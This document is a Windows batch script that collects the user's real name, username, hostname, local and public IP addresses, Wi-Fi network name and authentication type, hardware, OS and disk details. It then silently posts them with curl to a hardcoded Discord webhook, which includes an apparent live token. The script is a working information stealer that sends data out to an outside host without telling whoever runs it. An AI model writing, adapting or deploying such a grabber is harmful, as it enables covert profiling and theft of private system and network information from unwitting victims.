@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul

:: --- Current date/time ---
set "datetime=%date% %time%"

:: --- Basic system info ---
set "username=%username%"
for /f %%i in ('hostname') do set "hostname=%%i"

:: Real name
for /f "tokens=2 delims==" %%a in ('wmic useraccount where name^="%username%" get fullname /value 2^>nul') do set "realname=%%a"
if not defined realname set "realname=%username%"

:: Local IP
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do set "localip=%%a"
set "localip=%localip: =%"

:: Public IP
set "publicip=Unavailable"
for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest -Uri https://api.ipify.org -UseBasicParsing).Content" 2^>nul') do set "publicip=%%i"

:: Wi-Fi info
set "wifi_ssid=N/A"
set "wifi_auth=N/A"
for /f "tokens=2 delims=:" %%A in ('netsh wlan show interfaces ^| findstr /C:"SSID" ^| findstr /V "BSSID"') do set "wifi_ssid=%%A"
if not "%wifi_ssid%"=="N/A" (
    for /f "tokens=2* delims=:" %%A in ('netsh wlan show profile name^="%wifi_ssid%" key^=clear ^| findstr /C:"Authentication"') do set "wifi_auth=%%B"
)

:: CPU, RAM, GPU
for /f "delims=" %%G in ('powershell -NoProfile -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)"') do set "cpu=%%G"
for /f "delims=" %%G in ('powershell -NoProfile -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty NumberOfCores).ToString()"') do set "cores=%%G"
for /f "delims=" %%G in ('powershell -NoProfile -Command "[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2).ToString()"') do set "ram=%%G"
for /f "delims=" %%G in ('powershell -NoProfile -Command "(Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name) -join ', '"') do set "gpu=%%G"

:: Disk Info
set "disk_body="
for /f "skip=1 tokens=1,2,3,4 delims= " %%A in ('wmic logicaldisk get caption^, description^, freespace^, size 2^>nul') do (
    if "%%A" NEQ "" (
        set "disk_body=!disk_body!Drive %%A - %%B, Free: %%C bytes, Total: %%D bytes\n"
    )
)

:: Power Info
for /f "tokens=*" %%A in ('powercfg /getactivescheme 2^>nul') do set "power_body=Active Power Scheme: %%A"

:: System Info (selected fields)
set "sysinfo_body="
for /f "tokens=*" %%A in ('systeminfo 2^>nul') do (
    echo %%A | findstr /C:"OS Name" /C:"OS Version" /C:"System Boot Time" /C:"System Locale" /C:"Total Physical Memory" >nul
    if !errorlevel! == 0 (
        set "sysinfo_body=!sysinfo_body!%%A\n"
    )
)

:: --- Discord webhook ---
set "webhook=https://discord.com/api/webhooks/1428753280187764787/QEvl5eKV66t35kTLtrbJXOM0W9XkDwUleol9n1OFLrA6Rmdj2dtvUq5A4Ijat7pjnFz_"

:: --- Combine all info into one message with separators ---
setlocal enabledelayedexpansion
set "full_message="
set "full_message=!full_message!🌐 System / Network Info\nDate/Time: %datetime%\nReal Name: %realname%\nUsername: %username%\nHostname: %hostname%\nLocal IP: %localip%\nPublic IP: %publicip%\nWi-Fi SSID: %wifi_ssid%\nWi-Fi Auth: %wifi_auth%\n__________\n🖥️ Hardware Info\nCPU: %cpu% (%cores% cores)\nRAM: %ram% GB\nGPU(s): %gpu%\n__________\n💻 OS Info\n!sysinfo_body!\n__________\n💾 Disk Info\n!disk_body!\n__________\n🔌 Power Info\n%power_body%\n__________"

:: Escape quotes for JSON
set "json=!full_message:"=\"!"

:: Send to Discord
curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"!json!\"}" "%webhook%"

endlocal
pause
